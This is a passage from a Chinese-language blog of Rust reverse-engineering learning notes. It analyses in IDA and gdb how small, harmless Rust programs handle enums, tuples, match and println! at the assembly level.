<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        lea     rdi, [rsp + 64]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp + 24], 2</span><br><span class="line">        mov     dword ptr [rsp + 28], 3</span><br><span class="line">        mov     dword ptr [rsp + 32], 5</span><br><span class="line">        mov     dword ptr [rsp + 36], 7</span><br><span class="line">        mov     dword ptr [rsp + 40], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 72]</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        lea     rax, [rip + .L__unnamed_1]</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        mov     qword ptr [rsp + 56], 5</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String,&amp;str)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，这里是将<code>String::new()</code>产生的<code>String</code>实例放在了开头，随后才是5个<code>i32</code>，最后是<code>&amp;str</code>。至于为什么要这样排列，询问了一个Rust大手子之后，给到的答案是：Rust数据结构和内存排布没有必然关联，Rust编译器可能根据不同的架构进行相应的内存结构调整，说人话就是——<font color=red><strong>不能预判，不是必然顺序排列</strong></font>。不过考虑到对于Tuple的遍历、索引等操作在代码中都是固定的，编译器在编译的时候完全可以将地址偏移与索引值一一对应，不影响正常的索引，但对于反编译则是一个巨大的噩梦，因为你不确定某个索引值的数据到底有多少偏移。另外，如何通过汇编代码对栈空间的布局判断是否存在一个tuple也是一个问题。在定义变量时，一个tuple完全可以拆分为多个变量进行定义，反正在汇编代码中也不会保存临时变量的变量名。这在内存中会表现出来不同吗？</p>
<p>我们还是通过实际验证来解答我们的问题。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">z</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = <span class="number">13</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>, x, y, z, a, b, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给出上面的两个Rust函数，通过查看6个整数值在内存中的排布可以发现，两者对于6个整数值都是按相同顺序进行排列，从低地址到高地址依次为2、3、5、7、11、13。不过在编译过程中发现，只有当变量被使用时，Rust编译器才会将这个变量编译到ELF中，否则这个变量将不会出现在ELF中。也就是说，我们不能仅仅通过栈内存排布判断源代码中是否定义了Tuple。不过转念一想，这样其实是合理的。Tuple实际上就相当于是一个匿名的结构体实例，想一想C语言中的结构体，实际上也就是将一堆各种类型的数据集合在一起，使用相邻的内存空间保存各个属性而已。定义一个具有两个int类型的C语言结构体，将其在栈内存中分配一个实例空间，与在栈内存中分配两个int类型的变量，在本质上是完全相同的。</p>
<p>因此，我们在对Rust ELF进行逆向分析时，不必纠结源码的编写者是否定义了元组，全部将其看做独立的变量就可以了。</p>
<h2 id="0x04-guess-a-number-part-2"><a class="markdownIt-Anchor" href="#0x04-guess-a-number-part-2"></a> 0x04. Guess a number .part 2</h2>
<p>好不容易说完了对Rust枚举类型和元组的逆向，接下来让我们回到最开始的那个程序，说到两个match语句。</p>
<p>对于第一个<code>match</code>语句，<code>match</code>的对象是一个枚举类型，在<code>match</code>语句体之内实际上是按照枚举类型进行分支。在汇编语句中，Rust是这样完成分支的：</p>
<p><img src="5.png" alt="" /></p>
<p>注意<code>0xCEAC</code>处的指令：<code>mov al, byte ptr [rsp+1D8h+var_C0]</code>，第二个操作数是<code>parse</code>方法的返回值，也就是<code>Result&lt;F, F::Err&gt;</code>。考虑到这里的<code>F</code>是<code>u32</code>类型，整个枚举类型占用的空间大小为8字节，因此<code>rax</code>返回的直接就是对象本身的内容（<code>0x??_0000_0000</code>）。第1个字节为枚举索引值，后4个字节为转换后的值。在<code>0xCEAC</code>地址的这条指令将第1个字节赋值给<code>al</code>后进行了比较（<code>cmp rax, 0</code>），这也就是分支的具体实现方法——提取出枚举类型的索引值，根据索引值进行分支。</p>
<p><img src="6.png" alt="" /></p>
<p>对于后面<code>cmp</code>方法返回值的<code>match</code>与之类似，本质上使用的也是<code>if-else</code>结构，主要是因为分支数量较少，没有必要使用跳转表，分支逻辑如上图所示。不过不同的是，第一个分支是判断枚举对象索引值是否等于<code>0xFF</code>，即-1。经过调试发现，<code>Ordering::Less</code>对应的枚举索引为-1，<code>Ordering::Greater</code>对应1，<code>Ordering::Equal</code>对应0。而对于每个分支，都只是一个简单的输出语句，这里就不再分析了。</p>
<h2 id="0x05-总结"><a class="markdownIt-Anchor" href="#0x05-总结"></a> 0x05. 总结</h2>
<p>在本文中，我们学习了：</p>
<ol>
<li>Rust的枚举类型在汇编代码层的数据结构实现。</li>
<li>Rust的元组Tuple类型在汇编代码层无法被有效识别，但可将其看做多个独立变量进行分析。</li>
<li>三个<code>Ordering</code>枚举对象的索引值为-1、0、1，与一般枚举对象索引值从0开始不同。</li>
<li>Rust倾向于当变量不再使用时就删除变量对象，以尽可能地提高安全性。</li>
<li>Rust的元组类型在汇编代码层栈空间的数据排列顺序与元组类型中数据的定义顺序不一定相同。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">Rust逆向学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-17 21:50:25" itemprop="dateCreated datePublished" datetime="2023-10-17T21:50:25+08:00">2023-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-19 00:05:53" itemprop="dateModified" datetime="2023-10-19T00:05:53+08:00">2023-10-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，Rust语言的热度越来越高，很多人都对Rust优雅的代码和优秀的安全性赞不绝口。对于开发是如此，对于CTF也是如此，在逆向题和pwn题中都有出现。从本文开始我们将开始进行Rust逆向的学习，笔者将尽可能通过现有的IDA（7.7版本）对Rust ELF文件中包含的特性进行分析与总结，尽可能地减少Rust逆向的难度，尽可能地解决分析过程中产生的每一个问题，最终争取达到能够通过IDA反汇编结果还原Rust代码的程度。</p>
<p>本系列将跟随《Rust权威指南》的学习路线完成Rust逆向工程的学习。</p>
<p>阅读本文前，建议首先掌握：</p>
<ul>
<li>✅ x86-64逆向的基础知识</li>
<li>✅ Rust语言的基本使用</li>
</ul>
<h1 id="hello-rust-reverse"><a class="markdownIt-Anchor" href="#hello-rust-reverse"></a> Hello, Rust Reverse</h1>
<p>首先我们写一个流程较猜数字稍简单一些的Rust程序，完成Rust ELF的第一次分析。<br />
以下是Rust源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Read Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">num</span> = input.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Input not a number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="keyword">match</span> num &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&quot;one&quot;</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&quot;two&quot;</span>,</span><br><span class="line">        x <span class="keyword">if</span> x &lt; <span class="number">10</span> =&gt; <span class="string">&quot;Something smaller than 10&quot;</span>,</span><br><span class="line">        _ =&gt; <span class="string">&quot;Something not smaller than 10&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用cargo build编译后将ELF文件放入IDA中进行分析。这个ELF文件没有去除符号表，便于分析。</p>
<h2 id="0x01-main函数定位"><a class="markdownIt-Anchor" href="#0x01-main函数定位"></a> 0x01. main函数定位</h2>
<p><img src="1.png" alt="" /></p>
<p>反汇编完成后，可以看到，左边栏的函数名大多很长，但也有一些规律可循。定位到main函数发现，main函数本身只有很少的几行代码，但Rust真正的main函数也不难找。看到<code>0xA020</code>处有一个main函数，这个项目笔者将其命名为revlab，而这个函数名中也正好就有revlab，因此可以推测出，这就是我们要找的Rust main函数。</p>
<p>但我们可以先不急着查看main函数的具体内容，单是这个main函数名就有一番研究的必要。<code>_ZN6revlab4main17h512e681518e409c2E</code>，这是Rust编译器赋予我们自己的main函数的函数名。有没有觉得这个函数名的命名规则很熟悉呢？没错，这种函数命名方式被称为<strong>name mangling</strong>，与C++编译器对函数的命名规则类似。这里参考<a target="_blank" rel="noopener" href="https://rustmagazine.github.io/rust_magazine_2021/chapter_7/hw-rust-name-mangling.html">资料</a>。我们就可以将这个函数名进行简单的翻译：<code>revlab::main</code>，前面的_ZN是固定开头，6代表下一个模块的名字长度，也就是后面的revlab，4相同，即解析main，17h后面是函数的哈希值，可以忽略。这里通过左边栏可以看到，IDA能够自动为我们完成函数名的解析。</p>
<h2 id="0x02-main函数分析"><a class="markdownIt-Anchor" href="#0x02-main函数分析"></a> 0x02. main函数分析</h2>
<p>别看我们第一次写的main函数只有短短的几行，转换成汇编之后却有点让人头疼。考虑到这是我们第一次进行分析，笔者尝试借助其他的工具辅助分析——<a target="_blank" rel="noopener" href="https://godbolt.org/">传送门</a>。这个网站可以帮助我们将源代码与汇编代码对应起来，帮助我们进行分析。</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，main函数的汇编逻辑还是比较复杂的，这也是Rust ELF的一个特点，使得Rust反汇编较C/C++更难。</p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行定义了一个字符串变量，使用<code>String::new()</code>方法。但是在汇编中可以发现，<code>call</code>调用<code>String::new()</code>函数并没有对返回值进行操作，而是将<code>rdi</code>进行了赋值，这与C语言不同，如果按照C语言的逻辑，则更像是<code>String::new(&amp;input)</code>。随后，笔者修改了代码进行试验，发现<code>Vec</code>的<code>new</code>方法流程类似。可见各个对象的<code>new</code>方法实际上是传了参的。</p>
<h3 id="line-2"><a class="markdownIt-Anchor" href="#line-2"></a> line 2</h3>
<p>第二行就比第一行热闹多了，由于<code>io::stdin()</code>返回的是<code>Stdin</code>，代码中使用的返回值与C语言一样，保存在<code>rax</code>中。不过这里是首先将函数地址赋值给<code>rax</code>，通过<code>call rax</code>完成调用。调用完<code>stdin()</code>后，Rust不知道为什么用了一个<code>jmp</code>指令，跨越了几条指令再继续执行后面的<code>read_line</code>方法。对于<code>read_line</code>方法，可以看到前3个寄存器进行了赋值。其中<code>rsi</code>是<code>io::stdin()</code>的返回值，也就是<code>Stdin</code>对象实例，<code>rdx</code>是字符串<code>input</code>的地址，这一点可以通过第一行对<code>[rsp+80]</code>赋值得知，那么<code>rdi</code>是什么呢？这里就需要返回到IDA界面查看。</p>
<p><img src="3.png" alt="" /></p>
<p>从上图可知，IDA将第一个参数解析为<code>self</code>，类型为<code>core::result::Result&lt;usize,std::io::error::Error&gt;</code>，而这个是<code>read_line</code>函数的返回值。这与<code>io::stdin()</code>不同，也是没有将返回值保存到<code>rax</code>。随后，代码继续向下，继续调用了<code>expect</code>方法，传入的d第一个参数就是<code>Result</code>实例，第二个参数是我们设置的错误字符串<code>Read Error!</code>地址，第三个参数为11，推测是错误字符串的长度，第四个参数通过查看发现，是这段汇编代码对应的源代码在工程中的路径。由此我们可以发现，如果今后我们需要分析一个不带符号的Rust ELF，发现有一个函数有4个参数，其中第2、4个参数均为字符串，且第4个参数是源文件地址、第3个参数是第2个参数字符串的长度，那么这个函数很有可能就是<code>expect</code>，通过跟踪第一个参数<code>Result</code>对象，可以继续进行分析。</p>
<p>汇编代码看到这里，我们能够发现，即使代码顺序执行，Rust编译器也一定要在一个函数调用结束后插入一个<code>jmp</code>指令，这一点可以从调用<code>read_line</code>方法可以得知，向下不断滑动窗口也能发现，整个<code>main</code>函数似乎是被许多<code>jmp</code>指令划分为许多小部分。</p>
<h3 id="line-3"><a class="markdownIt-Anchor" href="#line-3"></a> line 3</h3>
<p><img src="4.png" alt="" /></p>
<p>第三行首先看到，代码中使用了<code>deref</code>这个方法，至于为什么使用这个方法其实很好理解。<code>deref</code>传入的是<code>String</code>实例，返回的是字符串切片<code>&amp;str</code>，而<code>trim</code>方法实际上是以切片作为<code>self</code>的，因此这里Rust隐式地将<code>String</code>转成切片之后再执行<code>trim</code>。</p>
<p>调用<code>deref</code>方法后需要注意，这里将<code>rdx</code>和<code>rax</code>保存到了栈中。记得在学习字符串切片的时候，书中有提及字符串切片实际上由两个部分组成——指针与长度。这里我们只通过静态分析无法判断<code>rdx</code>和<code>rax</code>到底是多少，虽然我们心中可能已经知道答案，但这里还是通过简单的调试来验证一下。</p>
<p><img src="5.png" alt="" /></p>
<p>可以看到，这与我们的预期是相同的，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。因此我们知道了，<code>String</code>类型的<code>deref</code>方法会将返回值保存在两个寄存器——<code>rdx</code>与<code>rax</code>中。</p>
<p>好继续往下看。随后就是<code>trim</code>方法的调用，传入的第1个参数是字符串指针，第2个参数是长度。其返回值依然是保存在两个寄存器中。可见对于返回值为<code>&amp;str</code>的Rust方法，其返回的方式也有一定规律。</p>
<p><code>trim</code>之后是<code>parse</code>，返回值是<code>Result</code>类型，和<code>read_line</code>不同的是，<code>read_line</code>返回的<code>Result</code>实例没有泛型（<code>Result&lt;usize&gt;</code>），但是<code>parse</code>的返回值是<code>Result&lt;F, F::Err&gt;</code>，可能是这个原因，导致<code>read_line</code>可以将<code>Result</code>指针直接作为参数传递，而<code>parse</code>只能通过<code>rax</code>返回。不过目前这只是猜测，有关于Rust编译器对泛型的处理，就留到后面的文章中进行分析吧。</p>
<p>随后，有几行看似没有意义的汇编代码，像是<code>mov qword ptr [rsp + 240], rax</code>，这里的<code>[rsp+240]</code>在main函数自始至终只有这里被使用过。所以直接忽略。随后<code>expect</code>的传参与之前规则相同。</p>
<p>不过这里的<code>expect</code>是需要将返回值保存在<code>num</code>中的，也就是<code>mov dword ptr [rsp + 28], eax</code>这条语句，可见<code>num</code>是保存在<code>[rsp+0x28]</code>的位置。</p>
<h3 id="line-4~9"><a class="markdownIt-Anchor" href="#line-4~9"></a> line 4~9</h3>
<p>下面的几行是一个<code>println!</code>一个<code>match</code>语句的值。在学Rust的时候我们了解到，<code>match</code>语句可以实现类似于lambda函数的功能，每一个分支的<code>=&gt;</code>后都可以看成这个条件下<code>match</code>的返回值。就如这几行是将<code>match</code>的每一个分支语句都定义一个字符串切片作为传入<code>println!</code><br />
的格式化参数。</p>
<p>在上一行语句执行结束后，汇编代码首先将<code>num</code>的值放到<code>eax</code>中，随后进行分支判断。判断顺序是：是否等于1、是否等于2、是否小于10，而且<code>match</code>的判断语句是统一写在前面，具体的语句内容则放在后面。</p>
<p>通过对分支语句简单分析，容易得到<code>match</code>语句的“返回值”是保存在<code>[rsp+208]</code>和<code>[rsp+216]</code>，因为这个是<code>&amp;str</code>，所以要用<code>0x10</code>大小保存。</p>
<p><img src="6.png" alt="" /></p>
<p>不过在汇编代码中，<code>println!</code>的处理流程可能不是都在所有<code>match</code>流程之后，而是在中间插入了一段，随后又在跳转到后面。使用1.69.0的rustc版本编译发现所有的<code>match</code>分支都位于<code>println!</code>之后，而更新版本的1.73.0则是将<code>println!</code>前半部分放在<code>match</code>分支部分中间。</p>
<p>随后则是<code>println!</code>的宏展开部分，考虑到<code>println!</code>太常见，通过IDA的反汇编输出的源代码可以识别出其特征。可以看到在汇编中调用了<code>core::fmt::ArgumentV1::new_display</code>、<code>core::fmt::Arguments::new_v1</code>、<code>std::io::stdio::_print</code>这三个方法。其中前面两个推测是Rust宏的转换函数，也就是将宏中大括号部分替换为具体的参数，而最后一个方法则是输出内容到控制台。</p>
<p>对于第一个函数，其唯一一个参数是<code>match</code>返回的字符串切片的栈地址。而对于第二个函数，传参情况则比较复杂。根据下文的<code>_print</code>函数传入的参数判断，第一个参数应该是返回值字符串的地址，第二个参数指向一个换行符的地址，但意义不明，第三个参数为2，第四个参数为第一个函数的返回值<code>rax</code>内容。第五个参数为1。目前只能确定第1个参数的含义，因此我们需要请求gdb的帮助。</p>
<p><img src="7.png" alt="" /></p>
<p>可以看到，第1个函数返回的<code>rax</code>是要输出的字符串。注意到在ELF中并没有找到左右大括号<code>&#123;&#125;</code>这个字符串，判断可能是Rust使用了其他的方式进行解析。但是除了第一个参数之外其他参数的意义还是不明。我们不妨稍稍修改一下<code>println!</code>格式化字符串的值，看看代码有什么变化。</p>
<p><img src="8.png" alt="" /></p>
<p>这里我们将字符串修改为<code>a&#123;&#125;a&#123;&#125;</code>，在后面添加一个1作为第二个括号的占位符。随后我们发现，<code>core::fmt::ArgumentV1::new_display</code>函数被调用了两次。第一次调用传入<code>match</code>返回的字符串，而第二次调用传入的是这个东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_27:</span><br><span class="line">        .asciz  &quot;\001\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>这不正好就是1吗？也就是说，<code>core::fmt::ArgumentV1::new_display</code>这个函数是用来解析<code>println!</code>后面的参数的，将其转换为字符串切片，有几个大括号就需要调用几次。随后继续进行分析，发现汇编代码将两个函数解析得到的两个字符串切片放到了一个连续的栈地址空间，并将其作为参数4（<code>rcx</code>）传入。</p>
<p><img src="9.png" alt="" /></p>
<p>如上图所示，这里红框部分就是赋值过程，这个地方像是一个数组的结构，按照顺序排列每个大括号对应的字符串切片。由此便可以判断出参数5（<code>r8d</code>）的含义，其实就是解析的字符串切片的数量。</p>
<p>接下来我们再看一下参数2到底是什么东西。参数2指向了一个这样的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_28:</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_37</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>其中有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_36:</span><br><span class="line">        .byte   97      ; &#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">.L__unnamed_37:</span><br><span class="line">        .byte   10      ; &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
<p>这样看来，这里的含义也就清楚了。编译器在对宏进行展开时转义大括号的内容是这样操作的：</p>
<ul>
<li>首先将含有大括号的字符串以大括号分隔，并形成上面的这个数组结构。</li>
<li>对于每一个大括号，都调用一次转义函数进行转义，在栈中形成一个<code>&amp;str</code>的数组。</li>
<li>随后再调用另外一个函数（<code>core::fmt::Arguments::new_v1</code>）将这些切片拼起来组成最终的字符串。</li>
</ul>
<p><code>core::fmt::Arguments::new_v1</code>的5个参数含义分别就是：</p>
<ul>
<li><code>rdi</code>：输出字符串指针</li>
<li><code>rsi</code>：预编译的数组结构，表示宏不需要转义的字符串部分</li>
<li><code>rdx</code>：预编译数组结构的长度</li>
<li><code>rcx</code>：运行时解析的已经被转义的<code>&amp;str</code>数组</li>
<li><code>r8</code>：运行时解析的<code>&amp;str</code>数组长度</li>
</ul>
<p>这个函数调用完之后，就可以进行宏展开的后续代码了。对于<code>println!</code>而言是输出，也即调用<code>std::io::stdio::_print</code>。</p>
<p>输出之后，后面就没有多少代码了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB60_18:</span><br><span class="line">        lea     rdi, [rsp + 80]</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;alloc::string::String&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 248</span><br><span class="line">        ret</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic_cannot_unwind@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line">.LBB60_20:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 224]</span><br><span class="line">        call    _Unwind_Resume@PLT</span><br><span class="line">        ud2</span><br></pre></td></tr></table></figure>
<p>这里的<code>core::ptr::drop_in_place</code>应该是Rust将这个<code>String</code>对象实例回收了。随后将栈上抬，main函数就正常返回了。</p>
<h2 id="0x03-ida反汇编"><a class="markdownIt-Anchor" href="#0x03-ida反汇编"></a> 0x03. IDA反汇编</h2>
<p>上一节我们对Rust ELF的分析大多是基于汇编层面进行的，当代码量比较多的时候，基本块之间的跳转关系可能会更加复杂，不利于我们的分析。不过IDA提供了非常实用的反汇编功能，在分析时，笔者认为如果我们能够将反汇编的内容与纯汇编代码相结合，效果会更好。</p>
<p>但IDA的反汇编功能一开始毕竟是为C/C++设计的，对于Rust的反汇编结果不很直观也是正常的。</p>
<p><img src="10.png" alt="" /></p>
<p>在反汇编的输出结果中，出现了比较奇怪的地方。</p>
<p>最为明显的就是字符串的解析。通过查看ELF中保存字符串的地方可以发现，Rust的字符串与字符串之间有的是以换行符隔开的，有的根本就没有分割的字符，这与C/C++使用0字符分割每个字符串不同。因为Rust字符串切片的特性，对一个字符串切片的操作必然需要使用到这个切片的长度。既然已经知道了字符串的长度，字符串与字符串之间的分隔就显得没有那么必要了。</p>
<p>不过庆幸的是，反汇编中对于main函数的主要逻辑的解析还是比较清楚的，第一行的<code>String::new()</code>表示创建了一个<code>String</code>实例，随后多个函数的调用连在一起就组成了第二行的读取字符串内容，就是<code>expect</code>函数的解析看上去不是很舒服，毕竟其与C/C++的函数调用规则有些许不同。</p>
<p>再往下，可以看到<code>deref</code>、<code>trim</code>、<code>parse</code>、<code>expect</code>，这些函数组成了第三行的内容。</p>
<p>对于接下来的<code>match</code>，在反汇编界面中是将其解析成了多个<code>if-else</code>语句。随后就是<code>println!</code>的宏展开，输出字符串。输出后通过<code>drop_in_place</code>删除了一开始创建的<code>String</code>实例，函数返回。</p>
<h2 id="0x04-总结"><a class="markdownIt-Anchor" href="#0x04-总结"></a> 0x04. 总结</h2>
<p>以上就是我们的第一次Rust逆向尝试，还是有很多收获的，下面是本文的总结：</p>
<ol>
<li>Rust的main函数与ELF中的main不同，但很好找。</li>
<li>Rust编译器喜欢将代码用<code>jmp</code>指令分割为一个个小部分。</li>
<li>对于返回<code>&amp;str</code>的方法，是将切片的指针和长度分别保存在<code>rax</code>和<code>rdx</code>之中。</li>
<li>对于<code>struct</code>的<code>new</code>方法，一般可在反汇编界面中直接识别，在汇编中实际执行的更像是通过<code>xxx.new(&amp;target)</code>的方式进行初始化。</li>
<li>Rust对宏展开的处理有一定的规律，可通过这些规律在反汇编界面中识别出宏展开的部分。</li>
</ol>
<p>不得不说，Rust编译器在汇编层面的处理还是有点意思的。在后面的文章中，我们将尝试分析更加复杂的代码，尝试整理出更多Rust语言特性在汇编层面中的实现方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
